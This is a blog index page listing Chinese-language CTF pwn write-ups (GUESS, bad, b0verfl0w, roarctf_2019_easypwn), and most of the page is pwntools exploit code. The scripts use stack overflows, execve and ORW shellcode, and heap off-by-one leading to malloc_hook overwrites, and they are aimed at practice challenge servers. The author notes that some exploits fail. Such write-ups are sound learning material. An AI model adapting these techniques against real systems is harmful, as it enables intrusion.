


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<title> [ your blog title ]</title>
	
	
	<!-- stylesheets list from _config.yml -->
	
	<link rel="stylesheet" href="/css/PreciousJoy.css">
	
	<link rel="stylesheet" href="/css/top-bar.css">
	
	<link rel="stylesheet" href="/css/menu-outer.css">
	
	<link rel="stylesheet" href="/css/content-outer.css">
	
	<link rel="stylesheet" href="/css/bottom-outer.css">
	
	<link rel="stylesheet" href="/css/atom-one-dark.css">
	
	<link rel="stylesheet" href="/css/recent-posts-item.css">
	
	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
	
	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
	
	<link rel="stylesheet" href="/css/search.css">
	
	<link rel="stylesheet" href="/css/toc.css">
	
	<link rel="stylesheet" href="/css/sidebar.css">
	
	<link rel="stylesheet" href="/css/archive.css">
	
	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
	
	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
	
	
	
<meta name="generator" content="Hexo 6.3.0"></head>




<body id="wrapper">

	<div id="">
		
		<div id="top-bar">
			
			<div id="avatar-box">
				<img 
				class="avatar"
				src="/images/default-avatar.jpg" 
				alt="avatar">
			</div>

			<div id="top-bar-text">
				<div id="top-bar-title">
					pa1n
				</div>
				<div id="top-bar-slogan">
					
				</div>
			</div>

		</div>

		<div id="menu-outer">
			<div id="menu-inner">
				
				
				<div class="menu-item">
					<a href="/">Home</a>
				</div>
				
				<div class="menu-item">
					<a href="/about">About</a>
				</div>
				
				<div class="menu-item">
					<a href="/archives">Archives</a>
				</div>
				

				<div class="menu-item menu-item-search">
					
  <span class="local-search local-search-google local-search-plugin">
      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
      <div id="local-search-result" class="local-search-result-cls"></div>
  </span>
	
				</div>

			</div>
		</div>

		<div id="content-outer">
			<div id="content-inner">

				

<div id="recent-posts-box">

  
  <div id="recent-posts">
    <!-- <h1>Recent Posts</h1> -->
    
    
    <div class="recent-post-item">

      <a href="/2024/04/11/ciscn-final-5/" class="item-title">ciscn_final_5</a>
      
      <time datetime="2024-04-11T11:36:41.000Z">
        2024-04-11
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 没开偏移的保护
地址进行或运算后保存，最后一位存index




 -->
        <!-- </div> -->

        
        <h5 id="没开偏移的保护"><a href="#没开偏移的保护" class="headerlink" title="没开偏移的保护"></a>没开偏移的保护</h5><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193750286.png" alt="image-20240411193750286"></p>
<p>地址进行或运算后保存，最后一位存index</p>
<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411193908492.png" alt="image-20240411193908492"></p>
<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194425445.png" alt="image-20240411194425445"></p>
<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411194802328.png" alt="image-20240411194802328"></p>
<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240411195346375.png" alt="image-20240411195346375"></p>

        


        <span>
          <a class="article-read" href="/2024/04/11/ciscn-final-5/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/03/23/GUESS/" class="item-title">GUESS</a>
      
      <time datetime="2024-03-23T10:34:29.000Z">
        2024-03-23
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 开了canary

在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数
把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移本地一直打不通，调试也有问题expfrom pwn import*
from LibcSearcher import *
#p=remote(&quot;node5.buuoj.cn&quot;,26222)
p=process(&quot;./GUESS&quot;)
context.log_level=&quot;debug&quot;
elf=ELF(&#39;./GUESS&#39;)
puts_got=elf.got[&#39;puts&#39;]
libc=ELF(&#39;./libc-2.23.so&#39;)
payload=b&#39;a&#39;*0x128+p64(puts_ -->
        <!-- </div> -->

        
        <p>开了canary</p>
<p><img src="https://i0.imgs.ovh/2024/03/22/gkJhl.png" alt="image-20240323183540854"></p>
<h5 id="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数"><a href="#在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc-后面是第三个envp参数" class="headerlink" title="在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数"></a>在输入位置对应的第25个参数，相差0x128的位置上是main函数的第一个参数argc,后面是第三个envp参数</h5><p><img src="https://i0.imgs.ovh/2024/03/22/gsrOt.png" alt="image-20240323211819577"></p>
<h5 id="把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"><a href="#把argc的位置覆盖成puts-got-泄露偏移，算出environ-base-libc-sym-‘-environ’-这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移" class="headerlink" title="把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移"></a>把argc的位置覆盖成puts_got,泄露偏移，算出environ=base+libc.sym[‘__environ’],这个存着栈上的地址，即0x7ffdfb3b9728这个地址，这个地址存着环境变量，再覆盖argc为environ，打印出栈地址，再算偏移</h5><h5 id="本地一直打不通，调试也有问题"><a href="#本地一直打不通，调试也有问题" class="headerlink" title="本地一直打不通，调试也有问题"></a>本地一直打不通，调试也有问题</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node5.buuoj.cn&quot;,26222)
p=process(&quot;./GUESS&quot;)
context.log_level=&quot;debug&quot;
elf=ELF(&#39;./GUESS&#39;)
puts_got=elf.got[&#39;puts&#39;]
libc=ELF(&#39;./libc-2.23.so&#39;)
payload=b&#39;a&#39;*0x128+p64(puts_got)
p.recvuntil(&#39; guessing flag&#39;)

p.sendline(payload)
p.recvuntil(&#39;detected ***: &#39;)
puts_addr=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))
base=puts_addr-libc.sym[&#39;puts&#39;]
environ=base+libc.sym[&#39;__environ&#39;]
payload=b&#39;a&#39;*0x128+p64(environ)
gdb.attach(p)
p.recvuntil(&#39; guessing flag&#39;)
p.sendline(payload)

p.recvuntil(&#39;detected ***: &#39;)
envi=u64(p.recvuntil(&#39;\x7f&#39;).ljust(8,b&#39;\x00&#39;))
print(hex(envi))
flag=envi-0x168
payload=b&#39;a&#39;*0x128+p64(flag)
p.recvuntil(&#39; guessing flag&#39;)
p.sendline(payload)
p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2024/03/23/GUESS/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/03/22/bad/" class="item-title">bad</a>
      
      <time datetime="2024-03-22T06:08:42.000Z">
        2024-03-22
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- 


很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用seccomp_init(0LL);是初始化seccomp_init函数0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用
所以这道题只能用orw的方式获取flagmmap=0x123000
orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3
orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap
orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出

不把orw_payload写到栈上因为其很大
所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上
jmp_rsp_ret -->
        <!-- </div> -->

        
        <p><img src="https://i0.imgs.ovh/2024/03/21/eN68l.png" alt="image-20240322140930289"></p>
<p><img src="https://i0.imgs.ovh/2024/03/21/eNkFd.png" alt="image-20240322141022925"></p>
<p><img src="https://i0.imgs.ovh/2024/03/21/eN0sK.png" alt="image-20240322141035709"></p>
<h5 id="很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"><a href="#很明显地用shellcode写，不过不能用一般的shellcode来写-平时的shellcode是用通过系统调用exceve-‘bin-sh’-0-0-正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用" class="headerlink" title="很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用"></a>很明显地用shellcode写，不过不能用一般的shellcode来写,平时的shellcode是用通过系统调用exceve(‘bin/sh’,0,0),正如这道题，seccomp是Linux内核的一项功能，用于限制进程的系统调用</h5><h5 id="seccomp-init-0LL-是初始化seccomp-init函数"><a href="#seccomp-init-0LL-是初始化seccomp-init函数" class="headerlink" title="seccomp_init(0LL);是初始化seccomp_init函数"></a><strong><em>seccomp_init(0LL);</em></strong>是初始化seccomp_init函数</h5><h5 id="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"><a href="#0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用" class="headerlink" title="0，1，2，60，分别是允许进程可读，可写，可执行，和退出的系统调用"></a><strong><em>0，1，2，60</em></strong>，分别是允许进程可读，可写，可执行，和退出的系统调用</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eNBi2.png" alt="image-20240322141910159"></p>
<h5 id="所以这道题只能用orw的方式获取flag"><a href="#所以这道题只能用orw的方式获取flag" class="headerlink" title="所以这道题只能用orw的方式获取flag"></a>所以这道题只能用orw的方式获取flag</h5><pre><code class="lang-py">mmap=0x123000
orw_payload=shellcraft.open(&#39;./flag&#39;) #打开根目录下的flag文件，文件标识符为3
orw_payload+=shellcraft.read(3,mmap,0x50) #读取文件标识符为3的文件的0x50个字节到地址mmap
orw_payload+=shellcraft.write(1,mmap,0x50) #将mmap的地址的值输出
</code></pre>
<h5 id="不把orw-payload写到栈上因为其很大"><a href="#不把orw-payload写到栈上因为其很大" class="headerlink" title="不把orw_payload写到栈上因为其很大"></a>不把orw_payload写到栈上因为其很大</h5><p><img src="https://i0.imgs.ovh/2024/03/21/eaafo.png" alt="image-20240322151355993"></p>
<h5 id="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"><a href="#所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上" class="headerlink" title="所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上"></a>所以只能写到mmap地址上，返回地址让其执行到栈上读入orw-payload到mmap上</h5><p><img src="https://i0.imgs.ovh/2024/03/21/ea9JH.png" alt="image-20240322151126619"></p>
<pre><code class="lang-py">jmp_rsp_ret=asm(&#39;sub rsp,0x30;jmp rsp&#39;)
get_shell=asm(&#39;mov rax,0x123000;call rax&#39;)
payload=asm(shellcraft.read(0,mmap,0x100))+get_shell
payload=payload.ljust(0x28,b&#39;\x00&#39;)
payload+=p64(jmp_rsp)+jmp_rsp_ret#
</code></pre>
<h5 id="实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。"><a href="#实践证明，返回地址不能直接sub-rsp-0x30-jmp-rsp-得先jmp-esp-不然会报错，但我觉得最终的结果都差不多，但是不行。" class="headerlink" title="实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。"></a>实践证明，返回地址不能直接sub rsp,0x30;jmp rsp,得先jmp esp,不然会报错，但我觉得最终的结果都差不多，但是不行。</h5><h5 id="最后再写入orw-payload就行了"><a href="#最后再写入orw-payload就行了" class="headerlink" title="最后再写入orw_payload就行了"></a>最后再写入orw_payload就行了</h5><pre><code class="lang-py">p.sendline(asm(orw_payload))
</code></pre>

        


        <span>
          <a class="article-read" href="/2024/03/22/bad/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/03/20/b0verfl0w/" class="item-title">b0verfl0w</a>
      
      <time datetime="2024-03-20T15:07:25.000Z">
        2024-03-20
      </time>
      
      <!-- <div class="article-digest"> -->
        <!-- ; 汇编指令
xor ecx, ecx          ; 将 ecx 寄存器清零
mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0
push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0
push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中
mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号
int 0x80              ; 触发系统调用，执行 execve(&quot;/ -->
        <!-- </div> -->

        
        <pre><code class="lang-py">; 汇编指令
xor ecx, ecx          ; 将 ecx 寄存器清零
mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * 0
push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 0
push 0x68732f2f       ; 将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
push 0x6e69622f       ; 继续将字符串 &quot;/bin//sh&quot; 的 ASCII 码逆序压入栈
mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 &quot;/bin//sh&quot; 的地址）存放到 ebx 寄存器中
mov al, 0xb           ; 将 0xb 存放到 al 寄存器中，该值代表 execve 系统调用的编号
int 0x80              ; 触发系统调用，执行 execve(&quot;/bin//sh&quot;, NULL, NULL)
</code></pre>
<pre><code class="lang-py">shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;
</code></pre>
<p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p>
<h5 id="ret2shellcode-但是大小不够了"><a href="#ret2shellcode-但是大小不够了" class="headerlink" title="ret2shellcode,但是大小不够了"></a>ret2shellcode,但是大小不够了</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p>
<pre><code class="lang-py">sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)
</code></pre>
<h5 id="改写其他不行"><a href="#改写其他不行" class="headerlink" title="改写其他不行"></a>改写其他不行</h5><h5 id="返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址"><a href="#返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址" class="headerlink" title="返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址"></a>返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址</h5><pre><code class="lang-py">payload=asm(shellcode)+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sup_esp_jmp
</code></pre>
<p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p>
<p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p>
<p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p>
<h5 id="jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶"><a href="#jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶" class="headerlink" title="jmp esp的操作，把栈顶设为esp,同时eip指向栈顶"></a>jmp esp的操作，把栈顶设为esp,同时eip指向栈顶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
from LibcSearcher import *
#p=remote(&quot;node5.buuoj.cn&quot;,28594)
p=process(&quot;./b0verfl0w&quot;)
context.log_level=&quot;debug&quot;
context.arch=&#39;i386&#39;

shellcode=b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;+b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;+b&quot;\x0b\xcd\x80&quot;

print(len(shellcode))
#gdb.attach(p)
sleep(1)
jmp_esp=0x08048504
sub_esp_jmp=asm(&quot;sub esp,0x28;jmp esp&quot;)
payload=shellcode+b&#39;a&#39;*(0x20-len(shellcode))+b&#39;aaaa&#39;+p32(jmp_esp)+sub_esp_jmp
#p.sendline(payload)

p.sendline(payload)

p.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2024/03/20/b0verfl0w/"> Read more -->
          </span>
        </div>

        
    
    <div class="recent-post-item">

      <a href="/2024/03/18/roarctf-2019-easy-pwn/" class="item-title">roarctf_2019_easypwn</a>
      
      <time datetime="2024-03-18T15:03:09.000Z">
        2024-03-18
      </time>
      
      <!-- <div class="article-digest"> -->
        <!--  保护全开
edit函数

若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞

这里不太懂为什么伪造的堆1 free不会报错
free(1)


add(0x90)


试用这种方法也能show出main_arena


至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小
add(0x80)

奇怪，这里再申请0x80的大小，然后size还是0xa1

这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)



不过最后的话，是打不通的。expfrom pwn import *

r=remote(&#39;node5.buuoj.cn&#39;,28118)
#r=process(&#39;roarctf_2019_easy_pwn&#39;)
libc=ELF(&#39;./libc-2.23.so&#39;)
context.log_level=&quot;debug&quot;

de -->
        <!-- </div> -->

        
        <p> 保护全开</p>
<p>edit函数</p>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7kas.png" alt="image-20240320152622842"></p>
<p>若要编辑的大小大过申请的10，可以多输入一字节，存在off-by-one漏洞</p>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7IOU.png" alt="image-20240320153710315"></p>
<h4 id="这里不太懂为什么伪造的堆1-free不会报错"><a href="#这里不太懂为什么伪造的堆1-free不会报错" class="headerlink" title="这里不太懂为什么伪造的堆1 free不会报错"></a>这里不太懂为什么伪造的堆1 free不会报错</h4><p><img src="https://i0.imgs.ovh/2024/03/19/e7wKH.png" alt="image-20240319203609474"></p>
<pre><code class="lang-py">free(1)
</code></pre>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7pZO.png" alt="image-20240319204503356"></p>
<pre><code class="lang-py">add(0x90)
</code></pre>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7HD9.png" alt="image-20240319204909619"></p>
<p>试用这种方法也能show出main_arena</p>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7nO3.png" alt="image-20240319205416560"></p>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7lwe.png" alt="image-20240319211634694"></p>
<h4 id="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"><a href="#至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小" class="headerlink" title="至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小"></a>至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</h4><p><img src="https://i0.imgs.ovh/2024/03/18/eKiYo.png" alt="image-20240319233028210"></p>
<pre><code class="lang-py">add(0x80)
</code></pre>
<h5 id="奇怪，这里再申请0x80的大小，然后size还是0xa1"><a href="#奇怪，这里再申请0x80的大小，然后size还是0xa1" class="headerlink" title="奇怪，这里再申请0x80的大小，然后size还是0xa1"></a>奇怪，这里再申请0x80的大小，然后size还是0xa1</h5><p><img src="https://i0.imgs.ovh/2024/03/19/e73jD.png" alt="image-20240319213208476"></p>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7mLo.png" alt="image-20240319214042015"></p>
<h5 id="这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21"><a href="#这里也不太懂为什么要这样写-后面的p64-0x70-p64-0x21" class="headerlink" title="这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)"></a>这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</h5><pre><code class="lang-py">payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
</code></pre>
<p><img src="https://i0.imgs.ovh/2024/03/19/e760A.png" alt="image-20240319214344529"></p>
<p><img src="https://i0.imgs.ovh/2024/03/19/e7Wt5.png" alt="image-20240319214501997"></p>
<h5 id="不过最后的话，是打不通的。"><a href="#不过最后的话，是打不通的。" class="headerlink" title="不过最后的话，是打不通的。"></a>不过最后的话，是打不通的。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *

r=remote(&#39;node5.buuoj.cn&#39;,28118)
#r=process(&#39;roarctf_2019_easy_pwn&#39;)
libc=ELF(&#39;./libc-2.23.so&#39;)
context.log_level=&quot;debug&quot;

def add(size):
    r.recvuntil(&#39;choice: &#39;)
    r.sendline(&#39;1&#39;)
    r.recvuntil(&#39;size:&#39;)
    r.sendline(str(size))

def edit(index,size,data):
    r.recvuntil(&#39;choice: &#39;)
    r.sendline(&#39;2&#39;)
    r.recvuntil(&#39;index:&#39;)
    r.sendline(str(index))
    r.recvuntil(&#39;size:&#39;)
    r.sendline(str(size))
    r.recvuntil(&#39;content:&#39;)
    r.send(data)

def free(index):
    r.recvuntil(&#39;choice: &#39;)
    r.sendline(&#39;3&#39;)
    r.recvuntil(&#39;index:&#39;)
    r.sendline(str(index))

def show(index):
    r.recvuntil(&#39;choice: &#39;)
    r.sendline(&#39;4&#39;)
    r.recvuntil(&#39;index:&#39;)
    r.sendline(str(index))  

add(0x18)
add(0x10)
add(0x90)
add(0x10)

edit(0,0x22,b&#39;b&#39;*0x10+p64(0x20)+p8(0xa1))

edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))

free(1)
add(0x90)

edit(1,0x20,p64(0)*3+p64(0xa1))
free(2)
show(1)
r.recvuntil(&#39;content:&#39;)
r.recv(0x20)
main_arena=u64(r.recvuntil(&#39;\x7f&#39;).strip()[-6:].ljust(8,b&#39;\x00&#39;))-88
malloc_hook=main_arena-0x10
base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
realloc_hook=base+libc.sym[&#39;__realloc_hook&#39;]
add(0x80)
print(hex(main_arena))
payload=p64(0)*3+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21)
edit(1,0x90,payload)
free(2)

payload=p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)
edit(1,0x28,payload)
add(0x60) #2

add(0x60) #4

one=[0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget=base+one[3]
edit(4,0x1b,b&#39;a&#39;*11+p64(one_gadget)+p64(realloc_hook+4))
#gdb.attach(r)
sleep(1)
add(0x10)

r.interactive()
</code></pre>

        


        <span>
          <a class="article-read" href="/2024/03/18/roarctf-2019-easy-pwn/"> Read more -->
          </span>
        </div>

        
      </div>
      


      <div id="recent-posts-paginator">
        <a class="extend prev" rel="prev" href="/page/2/"> </a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/4/"> </a>
      </div>

    </div>

<aside id="sidebar">
  
  <div class="widget-box">
  	  <div class="widget-box">
    <h3 class="widget-title-friends">friends</h3>
    <div class="widget">
      
        <a class="friends-list-link" style="display: block;" href="https://fireworks99.github.io/" title target='_blank'
        >fireworks99</a>
      
    </div>
  </div>

  </div>
  
  <div class="widget-box">
  	

  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-tag">tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
    </div>
  </div>


  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-archive">archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
    </div>
  </div>

  </div>
  
  <div class="widget-box">
  	
  <div class="widget-box">
    <h3 class="widget-title-post">recent_posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/09/21/stdout/">stdout</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/">解决libc6软件包和libc6-dev不匹配的问题</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/09/13/glibc/">glibc</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/09/12/gostack/">gostack</a>
          </li>
        
          <li>
            <a class="recent_posts-list-link" href="/2024/09/08/pstack/">pstack</a>
          </li>
        
      </ul>
    </div>
  </div>

  </div>
  
</aside>

<!-- <div id="paginator"> -->
<!--   <a class="extend prev" rel="prev" href="/page/2/"> </a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/4/"> </a> -->
<!-- </div> -->

    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"] ],
            processEscapes: true
          }
        });
      </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
            tex2jax: {
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
            }
          });
      </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
              var all = MathJax.Hub.getAllJax(), i;
              for(i=0; i < all.length; i += 1) {
                  all[i].SourceElement().parentNode.className += ' has-jax';
              }
          });
    </script>

    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>



			</div>
		</div>

		<div id="bottom-outer">
			<div id="bottom-inner">
				Site by your name | 
				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
			</div>
		</div>

		
	</div>





	
	<!-- scripts list from theme config.yml -->
	
	<script src="/js/jquery-3.5.1.min.js"></script>
	
	<script src="/js/PreciousJoy.js"></script>
	
	<script src="/js/highlight.pack.js"></script>
	
	<script src="/js/jquery.fancybox.min.js"></script>
	
	<script src="/js/search.js"></script>
	
	<script src="/js/load.js"></script>
	
	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
	
	<script src="/js/clipboard.min.js"></script>
	
	

	<script>hljs.initHighlightingOnLoad();</script>

</body>
</html>
